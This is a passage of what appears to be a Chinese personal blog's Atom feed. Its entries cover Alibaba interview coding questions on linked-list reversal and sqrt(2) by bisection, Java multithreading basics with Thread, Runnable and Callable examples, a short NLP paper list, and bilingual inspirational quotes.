    <content type="html"><![CDATA[<h4 id="1-1-1-如何实现一个高效的单向链表逆序输出？"><a href="#1-1-1-如何实现一个高效的单向链表逆序输出？" class="headerlink" title="1.1.1 如何实现一个高效的单向链表逆序输出？"></a>1.1.1 如何实现一个高效的单向链表逆序输出？</h4><p>出题人：阿里巴巴出题专家：昀龙／阿里云弹性人工智能负责人</p><h5 id="参考答案：下面是其中一种写法，也可以有不同的写法，比如递归等。供参考。"><a href="#参考答案：下面是其中一种写法，也可以有不同的写法，比如递归等。供参考。" class="headerlink" title="参考答案：下面是其中一种写法，也可以有不同的写法，比如递归等。供参考。"></a>参考答案：下面是其中一种写法，也可以有不同的写法，比如递归等。供参考。</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span>           data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>*  <span class="title">next</span>;</span></span><br><span class="line">    node(<span class="keyword">int</span> d):data(d), next(<span class="literal">NULL</span>)&#123;&#125;</span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(node* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">NULL</span> == head || <span class="literal">NULL</span> == head-&gt;next)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    node* prev=<span class="literal">NULL</span>;</span><br><span class="line">    node* pcur=head-&gt;next;</span><br><span class="line">    node* next;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(pcur!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pcur-&gt;next==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            pcur-&gt;next=prev;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        next=pcur-&gt;next;</span><br><span class="line">        pcur-&gt;next=prev;</span><br><span class="line">        prev=pcur;</span><br><span class="line">        pcur=next;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    head-&gt;next=pcur;</span><br><span class="line">    node*tmp=head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(tmp!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;tmp-&gt;data&lt;&lt;<span class="string">"\t"</span>;</span><br><span class="line">        tmp=tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-1-2-题目：已知-sqrt-2-约等于-1-414，要求不用数学库，求-sqrt-2-精确到小数点后-10-位。"><a href="#1-1-2-题目：已知-sqrt-2-约等于-1-414，要求不用数学库，求-sqrt-2-精确到小数点后-10-位。" class="headerlink" title="1.1.2 题目：已知 sqrt (2)约等于 1.414，要求不用数学库，求 sqrt (2)精确到小数点后 10 位。"></a>1.1.2 题目：已知 sqrt (2)约等于 1.414，要求不用数学库，求 sqrt (2)精确到小数点后 10 位。</h4><p>出题人：——阿里巴巴出题专家：文景／阿里云 CDN 资深技术专家</p><h4 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h4><ol><li>基础算法的灵活应用能力（二分法学过数据结构的同学都知道，但不一定往这个方向考虑；如果学过数值计算的同学，应该还要能想到牛顿迭代法并解释清楚）</li><li>退出条件设计</li></ol><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><ol><li><p>已知 sqrt(2)约等于 1.414，那么就可以在(1.4, 1.5)区间做二分<br>查找，如：<br>a) high=&gt;1.5<br>b) low=&gt;1.4<br>c) mid =&gt; (high+low)/2=1.45<br>d) 1.45*1.45&gt;2 ? high=&gt;1.45 : low =&gt; 1.45<br>e) 循环到 c)</p></li><li><p>退出条件<br>a) 前后两次的差值的绝对值&lt;=0.0000000001, 则可退出</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">const double EPSINON = 0.0000000001;</span><br><span class="line"></span><br><span class="line">double sqrt2( )&#123;</span><br><span class="line">    double low = 1.4, high = 1.5;</span><br><span class="line">    double mid = (low + high) / 2;</span><br><span class="line">    </span><br><span class="line">    while (high - low &gt; EPSINON)&#123;</span><br><span class="line">        if (mid*mid &gt; 2)&#123;</span><br><span class="line">            high = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            low = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        mid = (high + low) / 2;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return mid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-1-1-如何实现一个高效的单向链表逆序输出？&quot;&gt;&lt;a href=&quot;#1-1-1-如何实现一个高效的单向链表逆序输出？&quot; class=&quot;headerlink&quot; title=&quot;1.1.1 如何实现一个高效的单向链表逆序输出？&quot;&gt;&lt;/a&gt;1.1.1 如何实现一个高效
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Java的多线程-基础知识(1)</title>
    <link href="http://yoursite.com/2019/07/23/Java-multi-thread-note/"/>
    <id>http://yoursite.com/2019/07/23/Java-multi-thread-note/</id>
    <published>2019-07-23T10:22:20.000Z</published>
    <updated>2019-11-02T12:24:05.717Z</updated>
    
    <content type="html"><![CDATA[<p>今天整理一下java的多线程部分的基础知识</p><h3 id="废话篇"><a href="#废话篇" class="headerlink" title="废话篇"></a>废话篇</h3><p>今年7月中旬的时候从我的大学毕业了，这一段时间在家里带了几天娃，希望我的博客不倒，小外甥女长大能看到。（笑哭</p><p>前一段时间学习了Java的多线程，Java多线程编程的基础内容并不难，但是刚学完多线程我对这个多线程有了一些疑问——Java的多线程程序在计算机中究竟是怎么运行的呢？带着这个疑问开始了下面的探寻之路。</p><h3 id="Java多线程编程回顾"><a href="#Java多线程编程回顾" class="headerlink" title="Java多线程编程回顾"></a>Java多线程编程回顾</h3><p>java的多线程在Java8中总共有3种实现方式，即通过继承thread类，实现Runable接口，使用callable、线程池executor、future来创建可以返回值的线程。下面简单看一下这三者实现的一个demo。</p><h4 id="1、继承thread类来创建线程"><a href="#1、继承thread类来创建线程" class="headerlink" title="1、继承thread类来创建线程"></a>1、继承thread类来创建线程</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadMethod</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    ThreadMethod(String name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里通过重写Thread类的run()方法达到起多线程的目的</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            System.out.println(name + <span class="string">":"</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            sleep((<span class="keyword">int</span>) (Math.random() * <span class="number">10</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestMain1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里就起了两个线程，线程的代码顺序和线程的执行顺序无关</span></span><br><span class="line">        ThreadMethod threadClass1 = <span class="keyword">new</span> ThreadMethod(<span class="string">"AA"</span>);</span><br><span class="line">        ThreadMethod threadClass2 = <span class="keyword">new</span> ThreadMethod(<span class="string">"BB"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里可以通过调用run方法来看看线程和非线程的区别，如果是调用run方法时，得到的结果是顺序执行的，</span></span><br><span class="line">        <span class="comment">// 但是start()方法是线程执行的方法，因此如果用多线程的方法就要使用start()</span></span><br><span class="line">        <span class="comment">// 注意：start()方法的调用后并不是立即执行多线程代码，而是使得该线程变为可运行态（Runnable），什么时候运行是由操作系统决定的。</span></span><br><span class="line">        threadClass1.start();</span><br><span class="line">        threadClass2.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据Java的单继承模式（即一个类只能继承一个类），所以如果一个类继承Thread，则不适合资源共享。但是如果实现了Runable接口的话（因为java的接口是多继承关系，即一个类可以实现多个接口），这样则很容易的实现资源共享（<u><strong>这里的资源共享是什么意思</strong>？</u>）。</p><h4 id="2、实现Runable接口来创建线程"><a href="#2、实现Runable接口来创建线程" class="headerlink" title="2、实现Runable接口来创建线程"></a>2、实现Runable接口来创建线程</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RunnableThreadMethod</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    RunnableThreadMethod(String name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">"运行开始"</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            System.out.println(name + <span class="string">":"</span> + i);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i==<span class="number">8</span> &amp;&amp; Thread.currentThread().getName().equals(<span class="string">"Thread-0"</span>))&#123;</span><br><span class="line">                System.out.println(<span class="string">"yield start"</span>);</span><br><span class="line">                <span class="comment">// yield只是从程序上控制线程的运行状态，即将其在程序层面上转为可运行状态也就是就绪状态，但是硬件层面CPU调度还是有</span></span><br><span class="line">                <span class="comment">// 可能将同时处于可运行状态中的该线程拿出来跑。</span></span><br><span class="line">                Thread.yield();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            sleep((<span class="keyword">int</span>) (Math.random() * <span class="number">10</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">"运行结束"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestMain2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">"运行开始"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Thread2类通过实现Runnable接口，使得该类有了多线程类的特征。run（）方法是多线程程序的一个约定。</span></span><br><span class="line">        <span class="comment">// 所有的多线程代码都在run方法里面。Thread类实际上也是实现了Runnable接口的类。</span></span><br><span class="line">        RunnableThreadMethod runnableThreadMethod1 = <span class="keyword">new</span> RunnableThreadMethod(<span class="string">"C"</span>);</span><br><span class="line">        RunnableThreadMethod runnableThreadMethod2 = <span class="keyword">new</span> RunnableThreadMethod(<span class="string">"D"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在启动的多线程的时候，需要先通过Thread类的构造方法Thread(Runnable target) 构造出对象，</span></span><br><span class="line">        <span class="comment">// 然后调用Thread对象的start()方法来运行多线程代码。</span></span><br><span class="line">        <span class="comment">// 实际上所有的多线程代码都是通过运行Thread的start()方法来运行的。因此，不管是扩展Thread类还是</span></span><br><span class="line">        <span class="comment">// 实现Runnable接口来实现多线程，最终还是通过Thread的对象的API来控制线程的，熟悉Thread类的API是进行多线程编程的基础。</span></span><br><span class="line">        Thread thread1 = <span class="keyword">new</span> Thread(runnableThreadMethod1);</span><br><span class="line">        thread1.start();</span><br><span class="line">        <span class="keyword">new</span> Thread(runnableThreadMethod2).start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            thread1.join();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">"运行结束"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3、使用call、线程池executor、future来创建可以返回值的线程"><a href="#3、使用call、线程池executor、future来创建可以返回值的线程" class="headerlink" title="3、使用call、线程池executor、future来创建可以返回值的线程"></a>3、使用call、线程池executor、future来创建可以返回值的线程</h4><p>如果对一些场合需要线程返回的结果。就要使用用Callable、Future、FutureTask、CompletionService这几个类。Callable只能在ExecutorService的线程池中跑，但有返回结果，也可以通过返回的Future对象查询执行状态。<br>Future 本身也是一种设计模式，它是用来取得异步任务的结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CallThreadMethod</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">CallThread</span> <span class="keyword">implements</span> <span class="title">Callable</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String taskName;</span><br><span class="line"></span><br><span class="line">        CallThread(String name) &#123;</span><br><span class="line">            <span class="keyword">this</span>.taskName = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">" start"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            Date date1 = <span class="keyword">new</span> Date();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                sum = sum + i;</span><br><span class="line">                System.out.println(taskName + <span class="string">":"</span> + i);</span><br><span class="line">            &#125;</span><br><span class="line">            Date date2 = <span class="keyword">new</span> Date();</span><br><span class="line">            <span class="keyword">long</span> time = date2.getTime() - date1.getTime();</span><br><span class="line"></span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">" end"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> taskSize = <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// 创建一个线程池</span></span><br><span class="line">        ExecutorService executorServicePool = Executors.newFixedThreadPool(taskSize);</span><br><span class="line">        <span class="comment">// 创建具有返回值的任务</span></span><br><span class="line">        Callable callThreadMethod1 = <span class="keyword">new</span> CallThread(<span class="string">"AAa"</span>);</span><br><span class="line">        Callable callThreadMethod2 = <span class="keyword">new</span> CallThread(<span class="string">"BBA"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// way-1:执行任务并获取 Future对象</span></span><br><span class="line">        Future future1 = executorServicePool.submit(callThreadMethod1);</span><br><span class="line">        Future future2 = executorServicePool.submit(callThreadMethod1);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"通过方式1获得的10的和为："</span> + future1.get().toString());</span><br><span class="line">        System.out.println(<span class="string">"通过方式1获得的10的和为："</span> + future2.get().toString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// =============================================</span></span><br><span class="line">        <span class="comment">// way-2 通过invokeAll执行任务</span></span><br><span class="line">        List&lt;Future&lt;Object&gt;&gt; futureList = executorServicePool.invokeAll(asList(<span class="keyword">new</span> CallThread(<span class="string">"AAAA"</span>), <span class="keyword">new</span> CallThread(<span class="string">"BBB"</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭线程池</span></span><br><span class="line">        executorServicePool.shutdown();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Future&lt;Object&gt; item : futureList) &#123;</span><br><span class="line">            System.out.println(<span class="string">"通过方式2获得的结果："</span>+item.get());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面再说一说这三者的共同点和差异。</p><p>1、继承thread类和实现runnable接口的两种方式最终都是通过调用thread类的start方法启动线程的；<br>2、前两者(thread、runnable)都不能返回结果；<br>3、runnable实现的多线程 最终还是归一到thread上，这就表明runnable实现的多线程对象的方法是和thread实现的多线程对象的方法api是一致的；<br>4、单继承机制导致多线程类不能继承多个类，而runnable是一个接口类，因此可以实现类继承一个类和多个接口；<br>5、call方法可以返回结果，是使用了线程池，是继承了callable()接口，因此可以像runnable方法一样实现继承多个类。<br>6、call方法开启线程有两种方式，一种是使用submit方法接收CallThread的具体对象，一种是使用invokeAll方法接收一个CallThread对象列表。</p><p>如果需要线程返回结果，那么就选择call方式；如果不需要结果，那么有两种选择，那么建议使用runnable或者call方式。</p><h3 id="Java多线程的进一步思考"><a href="#Java多线程的进一步思考" class="headerlink" title="Java多线程的进一步思考"></a>Java多线程的进一步思考</h3><p>针对java的多线程，是不是这样写出来的代码就一定是并行运行的？</p><p>回想了操作系统相关的知识，进程是操作系统分配资源的最小单位，线程是操作系统调度的最小单位，那么就是说CPU资源是按照线程进行调度的，我们再回到目前的多核多线程的概念中去，目前购买CPU的时候，都会有一个双核4线程、4核8线程这种说法，就是说一个线程运行在CPU的核心上，这样的一般都是一个核心上运行2个线程。对于4核4线程，意味着该CPU可以同时运行4个线程，就是我们写一个4线程程序的时候，如果只有这一个程序使用，理想情况下CPU会全部为该程序服务。也就是说程序（进程）并发，线程在多核心CPU上是并行运行的，多线程程序在单核心单线程的CPU上是并发运行的。</p><p>Google一下“CPU多核多线程”keyword，可以搜到一堆关于这方面的讨论，不清楚的话可以多看几篇文章。</p><hr><p>项目的源码已开放在github上，项目地址：<a href="https://github.com/flowerlake/java-learning" target="_blank" rel="noopener">https://github.com/flowerlake/java-learning</a> ，这个项目包含了学习java的所有代码，感谢star。</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul><li><a href="https://blog.csdn.net/evankaka/article/details/51610635" target="_blank" rel="noopener">Java并发编程与技术内幕:Callable、Future、FutureTask、CompletionService</a></li><li><a href="https://blog.csdn.net/evankaka/article/details/44153709" target="_blank" rel="noopener">Java多线程学习（吐血超详细总结）</a></li><li><a href="https://www.zhihu.com/question/269329998" target="_blank" rel="noopener">关于多线程编程和CPU多核多线程的关系？</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天整理一下java的多线程部分的基础知识&lt;/p&gt;
&lt;h3 id=&quot;废话篇&quot;&gt;&lt;a href=&quot;#废话篇&quot; class=&quot;headerlink&quot; title=&quot;废话篇&quot;&gt;&lt;/a&gt;废话篇&lt;/h3&gt;&lt;p&gt;今年7月中旬的时候从我的大学毕业了，这一段时间在家里带了几天娃，希望我的博
      
    
    </summary>
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>nlp经典论文整理（持续更新）</title>
    <link href="http://yoursite.com/2019/05/24/nlp-paper/"/>
    <id>http://yoursite.com/2019/05/24/nlp-paper/</id>
    <published>2019-05-24T08:50:20.000Z</published>
    <updated>2019-05-27T07:24:29.836Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要整理一下在自然语言处理领域的一些经典paper和优质的文章。</p><h3 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h3><ul><li><a href="https://blog.csdn.net/qq_39521554/article/details/83062188" target="_blank" rel="noopener">NLP自然语言处理谷歌：BERT模型深度解析</a></li></ul><h3 id="paper"><a href="#paper" class="headerlink" title="paper"></a>paper</h3><ul><li>海量语料获取的方式：《A Neural Probabilistic Language Model》</li><li>Transformer模型的发明：《Attention Is All You Need》</li><li>对于Mask（遮挡）在语言模型上的应用<a href="https://arxiv.org/abs/1703.02573" target="_blank" rel="noopener">Data Noising as Smoothing in Neural Network Language Models</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文主要整理一下在自然语言处理领域的一些经典paper和优质的文章。&lt;/p&gt;
&lt;h3 id=&quot;文章&quot;&gt;&lt;a href=&quot;#文章&quot; class=&quot;headerlink&quot; title=&quot;文章&quot;&gt;&lt;/a&gt;文章&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.
      
    
    </summary>
    
      <category term="自然语言处理" scheme="http://yoursite.com/categories/%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86/"/>
    
    
      <category term="nlp" scheme="http://yoursite.com/tags/nlp/"/>
    
  </entry>
  
  <entry>
    <title>iridescent sentences</title>
    <link href="http://yoursite.com/2019/05/15/iridescent-sentence/"/>
    <id>http://yoursite.com/2019/05/15/iridescent-sentence/</id>
    <published>2019-05-14T16:00:00.000Z</published>
    <updated>2019-05-15T00:50:48.917Z</updated>
    
    <content type="html"><![CDATA[<p>我们总是喜欢拿“顺其自然”来敷衍人生路上的荆棘坎坷，却很少承认，真正的顺其自然，其实是竭尽所能之后的不强求，而非两手一摊的不作为。</p><p>Instead of admitting that the truth of “let it be” is to readily accept any kinds of outcome after making full efforts rather than to do noting at the very begining,we’d rather take “let it be” as an excuse to evade the path of thorns in out life.</p><hr><p>少一些功利主义的追求，多一些不为什么的坚持。</p><p>Less interests, More interest.</p><hr><p>你也许不是她的初恋，也许不会成为她的归宿、她的唯一。她爱过别人，也可能会有别的爱人。但她现在爱着你，其他的一切又算什么呢？她是个有缺点的女孩，而你也并不完美。你们俩在一起也许永远不会是珠联璧合。但如果她能引你大笑，能激发你重新思考，能让你承认自己是会犯错的凡人。那么请抓紧她，不要放手，给她你所能给的所有。她也许不是每分每秒都在想你，但她把自己最脆弱的那部分给了你——她的心。所以，请别伤害她，改变她，揣摩她，别期望她给你能力之外的东西。当她让你快乐时，请向她微笑；当她让你抓狂时，请让她知晓；当她不在你的身旁时，请深深地思念她。</p><p>“You may not be her first, her last, or her only. She loved before she may love again. But if she loves you now, what else matters? She’s not perfect—you aren’t either, and the two of you may never be perfect together but if she can make you laugh, cause you to think twice, and admit to being human and making mistakes, hold onto her and give her the most you can. She may not be thinking about you every second of the day, but she will give you a part of her that she knows you can break—her heart. So don’t hurt her, don’t change her, don’t analyze and don’t expect more than she can give. Smile when she makes you happy, let her know when she makes you mad, and miss her when she’s not there.”</p><hr><p>there are two kinds of pain:the sort of pain that makes you strong or useless pain.</p><p>世间有两种痛苦，一种让你更为强大，另一种毫无价值。</p><hr><p>I realize it’s all right that the world is crazy as long as I make my little corner of the world sane.</p><p>我意识到这个世界有多疯狂都没有关系，只要我自己的小天地正常就行了。</p><hr><p>Good artists copy，Great artists steal.</p><p>能工摹形、巧匠窃意。</p><hr><p>Even a cursory glance at the figures will tell you that sales are down.</p><p><strong>题外话</strong><br>作为一个伪文艺青年，不会写代码的程序员，经常会摘录下这些优美的句子，或激励自己，或充实自己。在有些困境下，确实会激发我的996（逃。同是一萍年少人，在评论区留下那些使你力量强大的诗句吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我们总是喜欢拿“顺其自然”来敷衍人生路上的荆棘坎坷，却很少承认，真正的顺其自然，其实是竭尽所能之后的不强求，而非两手一摊的不作为。&lt;/p&gt;
&lt;p&gt;Instead of admitting that the truth of “let it be” is to readily
      
    
    </summary>
    
